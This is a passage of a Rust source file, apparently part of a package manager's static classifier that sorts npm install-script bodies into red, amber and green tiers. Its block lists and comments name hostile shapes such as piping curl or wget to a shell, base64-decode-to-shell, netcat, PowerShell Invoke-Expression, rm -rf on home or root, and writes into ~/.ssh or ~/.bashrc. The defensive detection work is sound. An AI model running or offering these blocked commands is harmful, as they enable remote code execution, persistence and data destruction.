//! Layer 1 static-gate classifier.
//!
//! Pure, deterministic classification of lifecycle-script bodies into
//! one of three tiers:
//!
//! - [`StaticTier::Red`] — body matches a hand-curated blocklist of
//!   dangerous patterns (pipe-to-shell, base64-decode-to-execution,
//!   nested package-manager installs, Unicode obfuscation,
//!   PowerShell `Invoke-Expression` style, `rm -rf` on `$HOME`,
//!   etc.). Blocks unconditionally; never reaches the LLM.
//! - [`StaticTier::Green`] — body is exactly one of a tightly-curated
//!   allowlist of pure local build steps (`node-gyp rebuild`, `tsc`,
//!   `prisma generate`, `husky install`, `electron-rebuild`, and
//!   relative-path `node foo.js` style). No network binary
//!   downloaders (D18).
//! - [`StaticTier::Amber`] — everything else, including compound
//!   commands that mix otherwise-green steps, network binary
//!   downloaders per D18, and novel patterns. Deferred to
//!   layers 2/3/4.
//!
//! The classifier NEVER changes execution semantics. `static_tier` is
//! populated for UX annotation only; auto-execution of greens is gated
//! on the sandbox and tier-aware auto-run layer.
//!
//! Only `Green | Amber | Red` are emitted here; `AmberLlm` is reserved
//! for the LLM triage harness, not static classification.
//!
//! ## Algorithm
//!
//! 1. **Raw-string red prefilter** for markers that can survive or
//!    evade tokenization — Unicode control characters (RTL overrides,
//!    zero-width joiners, BOM) and PowerShell literals
//!    (`Invoke-Expression`, `FromBase64String`, `Add-MpPreference`).
//!    These are checked on the raw UTF-8 string before we ever call
//!    [`shlex::split`].
//! 2. **Normalize shell operators, then tokenize.** `shlex` splits on
//!    whitespace with POSIX quoting but does NOT recognize shell
//!    operators — it leaves `|`, `>`, `>>`, `&&`, `||`, etc. embedded
//!    in tokens when there is no surrounding whitespace (empirically:
//!    `curl url|sh` tokenizes as `["curl", "url|sh"]`). Before
//!    tokenizing we run a quote-aware pass that pads every unquoted
//!    operator with spaces so `shlex::split` can do its normal job.
//!    Parse failure (unmatched quotes, etc.) → Amber — the classifier
//!    fails closed. Empty input → Amber.
//! 3. **Tokenized red checks** — scan the token stream for dangerous
//!    commands (pipe-to-shell, `eval`, `node -e`, nested PM installs,
//!    `rm -rf` on dangerous targets, etc.). This runs BEFORE the
//!    compound-to-amber fallback so that constructs like `curl … | sh`
//!    correctly end up Red rather than Amber.
//! 4. **Compound detection** — any compound operator token (`&&`,
//!    `||`, `;`, `|`, `>`, `>>`, `<`, `<<`, `&`, subshell parens, or
//!    an embedded `` ` ``/`$(` inside a token) → Amber. Compounds of
//!    otherwise-green commands are deliberately amber: approving one
//!    green + one hidden red in the same body would be a silent
//!    bypass.
//! 5. **Green allowlist** — an exact match against a short, curated
//!    set of single-command token shapes.
//! 6. **Fallback** → Amber. Novel-but-uninteresting scripts land here
//!    by design; the user's explicit `lpm approve-scripts` review is
//!    the gate that moves them forward.

use std::sync::LazyLock;

use regex::Regex;

use crate::triage::StaticTier;

/// Additional manifest context the classifier can consult to widen the
/// green tier for safe-looking delegating scripts.
///
/// The classifier's six-step pipeline is **context-free** by default
/// (the script body is the only input). When a caller supplies a
/// `ManifestContext`, the post-tokenize check `matches_delegating_
/// identity_green` can additionally Green a `node install.js`-shaped
/// body when the package's manifest carries an identity signal that
/// pairs with the delegate.
///
/// Threat model: a malicious package can lie about its `repository`
/// field. The widening relies on the manifest field being honest. The
/// install pipeline counter-balance is that the local file's bytes
/// are still in the store and `lpm approve-scripts` review remains
/// available — the widening just changes the default from "always
/// prompt" to "auto-run when shape + identity agree."
pub struct ManifestContext<'a> {
    /// The package's `name` (with scope if scoped, e.g. `@swc/core`).
    pub package_name: &'a str,
    /// `repository` URL from `package.json`. Accept both shorthand
    /// strings and the full `git+https://…` shape; the classifier
    /// scans for the package's base name as a path segment.
    pub repository: Option<&'a str>,
    /// `bin` entries from `package.json`. Either the object-form's
    /// keys or the single bare-string form normalized to a list. The
    /// classifier treats each bin name as an identity signal — if the
    /// package exposes a binary named after itself, a `node install.js`
    /// fetching that binary aligns with the package's identity.
    pub bin_names: &'a [&'a str],
    /// The package's publish age in seconds (from now). When
    /// `min_release_age_secs > 0` AND this is below the threshold (or
    /// `None`, meaning age unknown), the identity-match widening REFUSES
    /// to fire — the package stays Amber and is subject to the
    /// script-tier review even when the install-level cooldown gate was
    /// bypassed via `--allow-new`.
    ///
    /// This preserves the orthogonality of the two security axes:
    /// `--allow-new` opts out of cooldown only; the script-tier
    /// review still happens for recent publishes. To also bypass
    /// the script-tier prompt the user explicitly chooses
    /// `--policy=allow` (or sets `minimumReleaseAge: 0` to opt out
    /// of cooldown universally, which then sets `min_release_age_secs`
    /// to 0 and disables the defense-in-depth check).
    pub publish_age_secs: Option<u64>,
    /// The configured minimum release age in seconds. Used to compare
    /// against `publish_age_secs`. The widening's cooldown defense-in-depth
    /// fires when this is `> 0`; when `0` the user has globally opted out
    /// of cooldown and the widening fires regardless of publish age.
    pub min_release_age_secs: u64,
}

/// Classify a single lifecycle-script body into a static tier.
///
/// The input is expected to be the **raw value** of one lifecycle
/// phase (`preinstall` / `install` / `postinstall`) exactly as it
/// appears in a package's `package.json`. Callers that need to
/// classify multiple phases should classify each independently and
/// aggregate worst-wins (Red > AmberLlm > Amber > Green) at the call
/// site — the classifier itself is scoped to a single command string.
///
/// Pure and deterministic: same input → same output across runs,
/// machines, and LPM versions (as long as the rule set hasn't been
/// edited).
///
/// Equivalent to [`classify_with_context`] with `ctx = None`. New
/// call sites that have manifest context available should prefer the
/// contextual form — it's a strict widening (no Green ever becomes
/// Amber/Red, no Red ever becomes Green), so passing `Some(ctx)` only
/// improves the green-rate without softening the safety floor.
pub fn classify(script: &str) -> StaticTier {
    classify_with_context(script, None)
}

/// Context-aware classification.
///
/// When `ctx` is `Some`, an additional green arm fires for
/// "delegate-to-local-file" installers (`node install.js` and close
/// variants) whose package identity matches the manifest's `repository`
/// URL or a `bin` entry name. When `ctx` is `None`, behavior is
/// identical to the context-free classifier.
///
/// The widening is **purely additive** — it can only convert an
/// otherwise-Amber tier into Green when identity matches. The
/// pre-existing Red checks and Green allowlist run unchanged, so
/// passing context never softens the floor.
pub fn classify_with_context(script: &str, ctx: Option<&ManifestContext<'_>>) -> StaticTier {
    // Empty / whitespace-only bodies don't run anything; treat as
    // Amber (the caller probably should have short-circuited already,
    // but fail conservative rather than silently green).
    if script.trim().is_empty() {
        return StaticTier::Amber;
    }

    // Step 1 — raw-string red prefilter.
    if contains_unicode_control_chars(script) || contains_powershell_red_literal(script) {
        return StaticTier::Red;
    }

    // Step 2 — normalize shell operators + tokenize. `shlex` only
    // splits on whitespace (with POSIX quoting); it does NOT
    // recognize shell operators. Empirically, `curl url|sh`
    // tokenizes as `["curl", "url|sh"]` (the `|` stays embedded),
    // which would silently downclass `curl … | sh` to Amber via the
    // compound-detection fallback. To fix, pad unquoted operators
    // with whitespace BEFORE handing the string to shlex. Parse
    // failure (unmatched quotes, etc.) → Amber, so malformed scripts
    // can't slip into Green.
    let normalized = normalize_operators(script);
    let tokens: Vec<String> = match shlex::split(&normalized) {
        Some(t) if !t.is_empty() => t,
        _ => return StaticTier::Amber,
    };

    // Step 3 — tokenized red checks. MUST run before the compound
    // fallback so `curl … | sh` doesn't degrade to Amber.
    if tokens_match_red(&tokens) {
        return StaticTier::Red;
    }

    // Step 4 — compound fallback.
    if tokens_are_compound(&tokens) {
        return StaticTier::Amber;
    }

    // Step 5 — green allowlist.
    if tokens_match_green(&tokens, script) {
        return StaticTier::Green;
    }

    // Step 5b — delegate-to-local-file installer with a matching
    // identity signal. Only fires when the caller supplied manifest
    // context; without it the classifier falls through to Amber.
    if let Some(ctx) = ctx
        && matches_delegating_identity_green(script, ctx)
    {
        return StaticTier::Green;
    }

    // Step 6 — default.
    StaticTier::Amber
}

// ─────────────────────────────────────────────────────────────────────
// Step 1 — raw-string prefilter
// ─────────────────────────────────────────────────────────────────────

/// Check for Unicode code points that enable bidi / direction
/// obfuscation inside otherwise-innocuous-looking script text. These
/// are never legitimately needed in a postinstall script body; a
/// maintainer who ships one is either mistaken or malicious, and
/// either way the script needs human review.
///
/// Covers:
/// - `U+200B..U+200F` — zero-width space / non-joiner / joiner +
///   left-to-right mark / right-to-left mark.
/// - `U+202A..U+202E` — bidirectional embedding / override controls
///   (the "Trojan Source" attack class).
/// - `U+2066..U+2069` — LRI / RLI / FSI / PDI isolates.
/// - `U+FEFF` — zero-width no-break space / BOM.
fn contains_unicode_control_chars(s: &str) -> bool {
    s.chars().any(|c| {
        let cp = c as u32;
        (0x200B..=0x200F).contains(&cp)
            || (0x202A..=0x202E).contains(&cp)
            || (0x2066..=0x2069).contains(&cp)
            || cp == 0xFEFF
    })
}

/// Check the raw (case-insensitive) script for PowerShell constructs
/// that are the common malware shape: `Invoke-Expression` (aliased as
/// `iex`), `FromBase64String`, `Add-MpPreference`. These survive
/// tokenization intact but a substring check is cheaper and equally
/// specific.
///
/// The bare `iex` token (PowerShell alias for `Invoke-Expression`) is
/// intentionally handled in [`tokens_match_red`] instead — checking
/// `iex` as a substring would false-positive on English words like
/// "complex" and "regex".
fn contains_powershell_red_literal(s: &str) -> bool {
    const LITERALS_LC: &[&str] = &["invoke-expression", "frombase64string", "add-mppreference"];
    let lower = s.to_ascii_lowercase();
    LITERALS_LC.iter().any(|lit| lower.contains(lit))
}

// ─────────────────────────────────────────────────────────────────────
// Step 2 — operator normalization (quote-aware)
// ─────────────────────────────────────────────────────────────────────

/// Pad every UNQUOTED shell operator with surrounding whitespace so
/// the downstream [`shlex::split`] produces standalone operator
/// tokens.
///
/// `shlex` handles POSIX word-splitting + quoting but does NOT
/// recognize shell operators. Without this pre-pass, `curl url|sh`
/// tokenizes as `["curl", "url|sh"]` (the `|` stays glued to the URL)
/// and the tokenized red check for pipe-to-shell never fires — the
/// script silently downclasses to Amber via the generic compound
/// fallback, violating the "red wins over compound" contract.
///
/// The walker tracks single-quote / double-quote / backslash escape
/// state so we don't touch operator characters that appear inside a
/// quoted string (those are literal content, not operators).
///
/// Recognized two-char operators (parsed as a unit so `>>` doesn't
/// become `> >`): `&&`, `||`, `>>`, `<<`.
///
/// Recognized single-char operators: `|`, `&`, `;`, `<`, `>`, `(`,
/// `)`.
///
/// Everything else (including `{`, `}`, brace-expansion, and process
/// substitution `<(…)`) is left untouched; this is a deliberately
/// conservative list focused on the operators that gate the red
/// patterns matched by the classifier.
fn normalize_operators(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 2);
    let mut chars = s.chars().peekable();
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while let Some(c) = chars.next() {
        // Backslash escapes the next char ONLY outside single quotes
        // (POSIX: inside `'…'`, backslash is literal).
        if c == '\\' && !in_single_quote {
            out.push(c);
            if let Some(next) = chars.next() {
                out.push(next);
            }
            continue;
        }

        if c == '\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            out.push(c);
            continue;
        }
        if c == '"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            out.push(c);
            continue;
        }

        if in_single_quote || in_double_quote {
            out.push(c);
            continue;
        }

        // Unquoted region — look for operators to pad.
        match c {
            '|' | '&' | '<' | '>' => {
                let two_char = matches!(
                    (c, chars.peek().copied()),
                    ('|', Some('|')) | ('&', Some('&')) | ('<', Some('<')) | ('>', Some('>'))
                );
                out.push(' ');
                out.push(c);
                if two_char {
                    out.push(chars.next().expect("peeked"));
                }
                out.push(' ');
            }
            ';' | '(' | ')' => {
                out.push(' ');
                out.push(c);
                out.push(' ');
            }
            _ => out.push(c),
        }
    }

    out
}

// ─────────────────────────────────────────────────────────────────────
// Step 3 — tokenized red checks
// ─────────────────────────────────────────────────────────────────────

fn tokens_match_red(tokens: &[String]) -> bool {
    if any_token_is_red_command(tokens) {
        return true;
    }
    if has_node_eval(tokens) {
        return true;
    }
    if has_pipe_to_shell(tokens) {
        return true;
    }
    if has_nested_package_manager(tokens) {
        return true;
    }
    if has_dangerous_rm(tokens) {
        return true;
    }
    if has_dangerous_chmod(tokens) {
        return true;
    }
    if has_dangerous_redirect(tokens) {
        return true;
    }
    false
}

/// Standalone commands that are always red no matter what comes after
/// them. Case-insensitive because `iex` is a PowerShell alias and
/// pwsh is case-insensitive; the others are checked against their
/// canonical lowercase spellings out of an abundance of caution.
fn any_token_is_red_command(tokens: &[String]) -> bool {
    tokens.iter().any(|t| {
        let lc = t.to_ascii_lowercase();
        matches!(lc.as_str(), "iex" | "nc" | "netcat" | "ncat" | "eval")
    })
}

/// `node -e '…'` / `node --eval '…'` — a small-surface RCE primitive
/// indistinguishable from malware when it shows up in a postinstall.
/// Requires the `-e` / `--eval` flag to be **adjacent** to `node` so
/// `node --other-flag -e` still trips (defensive against argument
/// reordering) but we don't false-positive on a random `-e` floating
/// elsewhere in the token stream.
///
/// **Softfail-wrapper exception**: the
/// canonical `node -e "try{require('./X')}catch(e){}"` and
/// `node -e "import('./X').catch(...)"` shape is shipped by core-js,
/// msw, nx, vue-demi, and es5-ext, among others. The body is a fixed
/// static string containing a single local relative require/import
/// with a swallowed error — fully equivalent in risk to `node ./X`
/// and explicitly not arbitrary-code-execution. When the body matches
/// that exact shape and the path is safe-relative, we skip the red
/// classification here so the script can land Green (via
/// [`matches_node_eval_softfail_green`]) or Amber via the fallback,
/// per the default-amber-unless-explicit-extension rule.
fn has_node_eval(tokens: &[String]) -> bool {
    for (i, t) in tokens.iter().enumerate() {
        if t != "node" {
            continue;
        }
        for (j, follower) in tokens.iter().enumerate().skip(i + 1) {
            if is_compound_op(follower) {
                break;
            }
            if follower == "-e" || follower == "--eval" {
                // The next token (after this flag) is the eval body.
                // If it's a safe softfail wrapper, don't red on this
                // `-e`; keep scanning (the outer for-loop covers the
                // unlikely "two node -e's in one script" case).
                if let Some(body) = tokens.get(j + 1)
                    && parse_softfail_wrapper(body).is_some()
                {
                    break;
                }
                return true;
            }
            if let Some(body) = follower.strip_prefix("--eval=") {
                if parse_softfail_wrapper(body).is_some() {
                    break;
                }
                return true;
            }
            if let Some(body) = follower.strip_prefix("-e=") {
                if parse_softfail_wrapper(body).is_some() {
                    break;
                }
                return true;
            }
            if let Some(body) = follower.strip_prefix("-e")
                && !body.is_empty()
            {
                if parse_softfail_wrapper(body).is_some() {
                    break;
                }
                return true;
            }
            // Keep scanning past other flags (e.g. `node --no-warnings -e`).
            if !follower.starts_with('-') {
                break;
            }
        }
    }
    false
}

/// The two canonical "soft-fail postinstall wrapper" shapes we accept.
///
/// Both have the same safety property: a single static require/import
/// of a relative local path with a swallowed error handler. The handler
/// body is constrained to trivial expressions (empty / `void 0` /
/// `undefined` / `null`) so we don't accept catchers that re-run
/// arbitrary code on error.
///
/// Capture group 1 is the relative path (everything inside the
/// require/import quotes).
static SOFTFAIL_TRY_REQUIRE: LazyLock<Regex> = LazyLock::new(|| {
    // try { require('./X') } catch (e) {}
    // Whitespace tolerated everywhere; semicolons optional; quotes
    // either flavour; catch handler signature unconstrained because the
    // catch BODY is required to be empty `{}`.
    Regex::new(
        r#"(?x)
        ^\s*
        try\s*\{\s*
            require\(\s*['"]([^'"]+)['"]\s*\)\s*;?\s*
        \}\s*
        catch\s*\([^)]*\)\s*\{\s*\}\s*;?
        \s*$
        "#,
    )
    .expect("SOFTFAIL_TRY_REQUIRE regex is well-formed")
});

static SOFTFAIL_IMPORT_CATCH: LazyLock<Regex> = LazyLock::new(|| {
    // import('./X').catch(() => void 0)
    // Trivial-handler-only: arrow with zero/one params, returning
    // `void 0`, `undefined`, `null`, or an empty `{}` body.
    Regex::new(
        r#"(?x)
        ^\s*
        import\(\s*['"]([^'"]+)['"]\s*\)
        \s*\.\s*catch\(\s*
            (?:
                \([^)]*\)            # `()` or `(e)` or `(_)`
                |[_a-zA-Z][\w_]*     # bare `e`
            )
            \s*=>\s*
            (?:
                void\s+0
                |undefined
                |null
                |\{\s*\}
            )
        \s*\)\s*;?
        \s*$
        "#,
    )
    .expect("SOFTFAIL_IMPORT_CATCH regex is well-formed")
});

/// Recognise the safe soft-fail postinstall wrapper shape. Returns the
/// inner relative path if `body` matches one of the two accepted
/// shapes, else `None`.
///
/// Examples that match (and capture the path):
/// - `try{require('./postinstall')}catch(e){}` → `./postinstall`
/// - `import('./scripts/postinstall.js').catch(() => void 0)` → `./scripts/postinstall.js`
///
/// Examples that do NOT match:
/// - `require('fs').unlinkSync('/etc/passwd')` — no try/catch wrap
/// - `try{require('./x')}catch(e){doEvil()}` — non-empty catch body
/// - `try{require('./a');require('./b')}catch(e){}` — multiple statements
fn parse_softfail_wrapper(body: &str) -> Option<String> {
    if let Some(caps) = SOFTFAIL_TRY_REQUIRE.captures(body) {
        return Some(caps.get(1)?.as_str().to_string());
    }
    if let Some(caps) = SOFTFAIL_IMPORT_CATCH.captures(body) {
        return Some(caps.get(1)?.as_str().to_string());
    }
    None
}

/// `curl … | sh` / `wget … | bash` / `base64 -d … | sh`. We look for a
/// `|` pipe operator whose RHS is a shell, and whose LHS contains
/// either a fetcher (`curl` / `wget` / `fetch`) or a `base64 -d` /
/// `base64 --decode`.
fn has_pipe_to_shell(tokens: &[String]) -> bool {
    const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish"];

    for (i, t) in tokens.iter().enumerate() {
        if t != "|" {
            continue;
        }
        let Some(next) = tokens.get(i + 1) else {
            continue;
        };
        if !SHELLS.contains(&next.as_str()) {
            continue;
        }
        let prior = &tokens[..i];
        let has_fetcher = prior
            .iter()
            .any(|p| matches!(p.as_str(), "curl" | "wget" | "fetch"));
        let has_base64_decode = prior
            .windows(2)
            .any(|w| w[0] == "base64" && matches!(w[1].as_str(), "-d" | "--decode"));
        if has_fetcher || has_base64_decode {
            return true;
        }
    }
    false
}

/// Nested package-manager install: the postinstall of package A
/// invoking `npm install B` / `pip install C` / etc. Always red —
/// the outer install has already resolved + audited its dependency
/// graph; a postinstall that reaches for another PM is actively
/// trying to run un-audited code.
fn has_nested_package_manager(tokens: &[String]) -> bool {
    // (command, allowed install verbs)
    const PAIRS: &[(&str, &[&str])] = &[
        ("npm", &["install", "i", "add"]),
        ("pnpm", &["install", "i", "add"]),
        ("yarn", &["add", "install"]),
        ("bun", &["add", "install"]),
        ("lpm", &["install", "i", "add"]),
        ("pip", &["install"]),
        ("pip3", &["install"]),
        ("gem", &["install"]),
        ("cargo", &["install"]),
        ("brew", &["install"]),
    ];
    tokens.windows(2).any(|w| {
        PAIRS
            .iter()
            .any(|(cmd, verbs)| w[0] == *cmd && verbs.contains(&w[1].as_str()))
    })
}

/// `rm -rf ~` / `rm -rf /` / `rm -rf $HOME` / `rm -rf *` and close
/// variants. We require BOTH `-r` and `-f` (in any flag spelling)
/// before considering targets — `rm foo.txt` without `-r` is not in
/// this red class.
fn has_dangerous_rm(tokens: &[String]) -> bool {
    for (i, t) in tokens.iter().enumerate() {
        if t != "rm" {
            continue;
        }
        let mut saw_r = false;
        let mut saw_f = false;
        let mut targets: Vec<&str> = Vec::new();
        for follower in tokens.iter().skip(i + 1) {
            if is_compound_op(follower) {
                break;
            }
            if let Some(flag) = follower.strip_prefix('-') {
                if flag.is_empty() || flag == "-" {
                    continue;
                }
                // Long-form `--recursive` / `--force`.
                if flag == "-recursive" || flag == "recursive" {
                    saw_r = true;
                    continue;
                }
                if flag == "-force" || flag == "force" {
                    saw_f = true;
                    continue;
                }
                // Short-form clusters like `-rf`, `-fr`, `-Rf`.
                for c in flag.chars() {
                    if c == 'r' || c == 'R' {
                        saw_r = true;
                    }
                    if c == 'f' {
                        saw_f = true;
                    }
                }
                continue;
            }
            targets.push(follower.as_str());
        }
        if !(saw_r && saw_f) {
            continue;
        }
        if targets.iter().any(|t| is_dangerous_rm_target(t)) {
            return true;
        }
    }
    false
}

fn is_dangerous_rm_target(target: &str) -> bool {
    // Exact matches for the canonical dangerous targets.
    if matches!(target, "/" | "~" | "*" | "/*" | "~/" | "~/*" | "./*") {
        return true;
    }
    // Home-dir-anchored — `~`, `$HOME`, `${HOME}`, `${HOME:-/root}`.
    if target.starts_with('~') || target.starts_with("$HOME") || target.starts_with("${HOME") {
        return true;
    }
    // Any absolute path is dangerous — a postinstall should never be
    // rm -rf'ing outside the package directory.
    if target.starts_with('/') {
        return true;
    }
    // Bare glob that'd expand in the CWD (typically the project dir).
    if target == "*" {
        return true;
    }
    false
}

/// `chmod +x` / `chmod 777` applied to a target outside the package
/// directory. Conservative: we treat any absolute path, `~`-anchored
/// path, or `$HOME`-anchored path as "outside" — we can't prove
/// anything further from the script text alone. Relative paths skip
/// the red classification (they might still land in Amber via the
/// generic fallback).
fn has_dangerous_chmod(tokens: &[String]) -> bool {
    for (i, t) in tokens.iter().enumerate() {
        if t != "chmod" {
            continue;
        }
        let mut saw_dangerous_mode = false;
        let mut targets: Vec<&str> = Vec::new();
        for follower in tokens.iter().skip(i + 1) {
            if is_compound_op(follower) {
                break;
            }
            if is_dangerous_chmod_mode(follower) {
                saw_dangerous_mode = true;
                continue;
            }
            if follower.starts_with('-') {
                // Some chmod implementations accept flags like `-R`;
                // treat as opaque and keep scanning for the target.
                continue;
            }
            targets.push(follower.as_str());
        }
        if !saw_dangerous_mode {
            continue;
        }
        if targets.iter().any(|t| is_outside_package_target(t)) {
            return true;
        }
    }
    false
}

fn is_dangerous_chmod_mode(m: &str) -> bool {
    // `+x`, `a+x`, `u+x`, `ugo+x`, `755`, `777`, leading-zero forms.
    if m == "+x" {
        return true;
    }
    if m.ends_with("+x") && m.len() <= 5 {
        // Short symbolic modes like `a+x`, `u+x`, `ugo+x`.
        return true;
    }
    matches!(m, "777" | "0777" | "755" | "0755")
}

fn is_outside_package_target(target: &str) -> bool {
    target.starts_with('~')
        || target.starts_with('/')
        || target.starts_with("$HOME")
        || target.starts_with("${HOME")
}

/// `>> ~/.bashrc` / `>> ~/.ssh/authorized_keys` / `> /etc/...` —
/// persistence-establishing redirects into user dotfiles or privileged
/// system paths. A postinstall writing into these locations is
/// malware-shaped regardless of what's being written.
fn has_dangerous_redirect(tokens: &[String]) -> bool {
    for (i, t) in tokens.iter().enumerate() {
        if t != ">>" && t != ">" {
            continue;
        }
        let Some(target) = tokens.get(i + 1) else {
            continue;
        };
        if is_dangerous_redirect_target(target) {
            return true;
        }
    }
    false
}

fn is_dangerous_redirect_target(target: &str) -> bool {
    const EXACT: &[&str] = &[
        "~/.bashrc",
        "~/.bash_profile",
        "~/.zshrc",
        "~/.zprofile",
        "~/.zshenv",
        "~/.profile",
        "~/.bash_login",
        "~/.bash_logout",
    ];
    if EXACT.contains(&target) {
        return true;
    }
    if target.starts_with("~/.ssh") {
        return true;
    }
    if target.starts_with("/etc/") || target.starts_with("/root/") {
        return true;
    }
    // `$HOME/.bashrc` and friends.
    if target.starts_with("$HOME/.") || target.starts_with("${HOME}/.") {
        return true;
    }
    false
}

// ─────────────────────────────────────────────────────────────────────
// Step 4 — compound detection
// ─────────────────────────────────────────────────────────────────────

/// A compound operator token. `shlex` doesn't understand shell
/// operators, so these appear as regular tokens (e.g. `"&&"`, `"|"`,
/// `">"`); we detect them by exact match. Subshell parens and backtick
/// command-substitution sit as **part of** tokens (since shlex treats
/// them as ordinary characters), so we also look for `$(` and `` ` ``
/// inside token contents.
fn is_compound_op(t: &str) -> bool {
    match t {
        "&&" | "||" | ";" | "|" | ">" | ">>" | "<" | "<<" | "&" | "(" | ")" => true,
        _ => t.contains("$(") || t.contains('`'),
    }
}

fn tokens_are_compound(tokens: &[String]) -> bool {
    tokens.iter().any(|t| is_compound_op(t))
}

// ─────────────────────────────────────────────────────────────────────
// Step 5 — green allowlist
// ─────────────────────────────────────────────────────────────────────

fn tokens_match_green(tokens: &[String], script: &str) -> bool {
    match tokens.first().map(String::as_str) {
        Some("node-gyp") => matches_node_gyp(tokens),
        Some("node-gyp-build") => tokens.len() == 1,
        Some("node-gyp-build-optional-packages") => tokens.len() == 1,
        Some("electron-rebuild") => tokens.len() == 1,
        Some("tsc") => matches_tsc(tokens),
        Some("prisma") => matches_prisma(tokens),
        Some("husky") => matches_husky(tokens),
        Some("node") => matches_node_relative(script) || matches_node_eval_softfail_green(script),
        Some("exit") => matches_exit_noop(tokens),
        Some(":") => tokens.len() == 1,
        Some("echo") => matches_echo_noop(tokens, script),
        _ => false,
    }
}

/// `exit` (no args) or `exit 0` — script-body no-op. Many native-
/// binding packages (e.g. `@datadog/native-*`) ship this as a
/// placeholder preinstall to satisfy npm's lifecycle-script schema
/// while the real work happens via optional platform dependencies.
fn matches_exit_noop(tokens: &[String]) -> bool {
    match tokens.len() {
        1 => true,
        2 => tokens[1] == "0",
        _ => false,
    }
}

/// `echo` (no args, prints newline) or `echo <static-literal>` —
/// trivially safe.
///
/// **Strict guard** on the single-argument form: the literal must NOT
/// be a flag (`-e`, `-n`, …), must not contain `$` (variable
/// expansion / command substitution sigil), backticks (command
/// substitution), or backslash (escape sequences). Multi-argument
/// forms stay amber. The audit-found case `echo 'preinstall: no-op'`
/// passes the guards (shlex strips the quotes, the literal contains
/// only printable ASCII and a colon).
///
/// Takes the raw script too because shlex CONSUMES unquoted
/// backslashes during tokenization (the user's `echo a\nb` arrives
/// here as `["echo", "anb"]` — the token-level check can't see the
/// backslash). Inspecting the raw script catches that case.
fn matches_echo_noop(tokens: &[String], script: &str) -> bool {
    // Raw-script backslash check: shlex would have eaten the escape
    // during tokenization, so any unquoted `\` in the body means the
    // green rule's "no backslashes" guard is violated.
    if script.contains('\\') {
        return false;
    }
    match tokens.len() {
        1 => true,
        2 => is_static_echo_literal(&tokens[1]),
        _ => false,
    }
}

/// Per-token guard for the single-argument `echo` green path.
/// Conservative: anything that could trigger shell expansion or
/// command substitution stays amber.
fn is_static_echo_literal(arg: &str) -> bool {
    if arg.starts_with('-') {
        return false;
    }
    if arg.contains('$') || arg.contains('`') || arg.contains('\\') {
        return false;
    }
    true
}

/// `node-gyp rebuild` with optional `--release` / `--debug`.
fn matches_node_gyp(tokens: &[String]) -> bool {
    if tokens.len() < 2 || tokens[1] != "rebuild" {
        return false;
    }
    tokens
        .iter()
        .skip(2)
        .all(|t| t == "--release" || t == "--debug")
}

/// `tsc`, `tsc --build`, `tsc -b`, `tsc -p <relative>`,
/// `tsc --project <relative>`.
fn matches_tsc(tokens: &[String]) -> bool {
    match tokens.len() {
        1 => true,
        2 => matches!(tokens[1].as_str(), "--build" | "-b"),
        3 => matches!(tokens[1].as_str(), "-p" | "--project") && is_safe_relative_path(&tokens[2]),
        _ => false,
    }
}

/// `prisma generate`.
fn matches_prisma(tokens: &[String]) -> bool {
    tokens.len() == 2 && tokens[1] == "generate"
}

/// `husky` (v9+ form) or `husky install` (v8 form).
fn matches_husky(tokens: &[String]) -> bool {
    match tokens.len() {
        1 => true,
        2 => tokens[1] == "install",
        _ => false,
    }
}

/// `node <relative>.js` (or `.cjs` / `.mjs`) where `<relative>` is a
/// non-escaping path inside the package directory AND the basename is
/// not one of the reserved lifecycle basenames (see
/// [`is_reserved_lifecycle_basename`] — the amber exception wins).
///
/// Dispatches through the shared [`extract_delegate_match`] recogniser
/// and applies the bare-shape + non-reserved-basename tier rule.
fn matches_node_relative(body: &str) -> bool {
    let Some(m) = extract_delegate_match(body) else {
        return false;
    };
    if !matches!(m.shape, DelegateShape::Bare) {
        return false;
    }
    let basename = m.path.rsplit('/').next().unwrap_or(&m.path);
    !is_reserved_lifecycle_basename(basename)
}

/// Lifecycle-phase basenames that trigger the reserved-basename
/// amber rule. Any `node <path>` green candidate whose target basename
/// matches one of these stays amber so the user explicitly
/// acknowledges the binary-download risk, even when the rest of the
/// command is otherwise green-eligible.
///
/// The list covers all three module-extension variants (`.js`,
/// `.cjs`, `.mjs`) for `install`, `postinstall`, and `preinstall` —
/// the audit surfaced popular packages using each non-`.js` variant
/// (puppeteer's `install.mjs`, @anthropic-ai/claude-code's
/// `install.cjs`, dd-trace's `scripts/preinstall.js`).
///
/// **Shared between two routes.** Both [`matches_node_relative`] and
/// [`matches_node_eval_softfail_green`] dispatch through this helper
/// to keep the direct-`node` and softfail-wrapper green paths in
/// lockstep. Adding a basename in only one of the two callers would
/// recreate the drift this helper exists to prevent.
fn is_reserved_lifecycle_basename(basename: &str) -> bool {
    matches!(
        basename,
        "install.js"
            | "install.cjs"
            | "install.mjs"
            | "postinstall.js"
            | "postinstall.cjs"
            | "postinstall.mjs"
            | "preinstall.js"
            | "preinstall.cjs"
            | "preinstall.mjs"
    )
}

/// `node -e "<safe softfail wrapper>"` lands here when:
/// - the eval'd body matches one of the two accepted softfail shapes,
/// - the inner path is safe-relative (no `..`, no abs, no `~`/`$`),
/// - the inner path has an explicit `.js` / `.cjs` / `.mjs` extension, AND
/// - the basename is **not** one of the reserved lifecycle basenames
///   (see [`is_reserved_lifecycle_basename`] — the amber exception
///   wins even when the require is wrapped in a softfail catch).
///
/// Default-amber rule: if any
/// of the above conditions fails, the script falls through to the
/// generic amber bucket. That keeps extensionless paths
/// (`./postinstall`, `./_postinstall`, `./dist/bin/post-install`) and
/// reserved-basename paths (`./scripts/postinstall.js`) out of green
/// even when the wrapper shape itself is recognized.
fn matches_node_eval_softfail_green(body: &str) -> bool {
    let Some(m) = extract_delegate_match(body) else {
        return false;
    };
    if !matches!(m.shape, DelegateShape::SoftfailWrapper) {
        return false;
    }
    let basename = m.path.rsplit('/').next().unwrap_or(&m.path);
    !is_reserved_lifecycle_basename(basename)
}

/// A path is "safe relative" if it points inside the package
/// directory without absolute-path / home-dir / env-var shortcuts
/// and without `..` escape segments.
fn is_safe_relative_path(p: &str) -> bool {
    if p.is_empty()
        || p.starts_with('/')
        || p.starts_with('~')
        || p.starts_with('$')
        || p.contains('\\')
    {
        return false;
    }
    p.split('/').all(|seg| seg != "..")
}

/// Which delegate shape [`extract_delegate_match`] recognised. The
/// classifier's per-shape tier rules (bare-delegate vs softfail
